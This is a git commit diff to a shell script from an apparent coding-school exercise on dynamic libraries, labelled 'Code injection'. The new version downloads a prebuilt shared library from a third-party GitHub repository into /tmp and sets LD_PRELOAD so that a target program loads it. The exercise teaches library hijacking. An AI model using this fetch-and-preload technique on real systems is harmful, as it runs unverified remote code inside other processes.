0deb67d579050b708a1d4b69588d092d09fb4736
zuriel0001 <dogbeykwame.kd@gmail.com>
2023-06-19 11:57:13 -0700

    Code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://raw.githubusercontent.com/zuriel0001/alx-low_level_programming/master/0x18-dynamic_libraries/objects
-export LD_PRELOAD="$PWD/../objects"
+wget -P /tmp/ https://raw.github.com/david-develop/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/gigalib.so
+export LD_PRELOAD=/tmp/gigalib.so
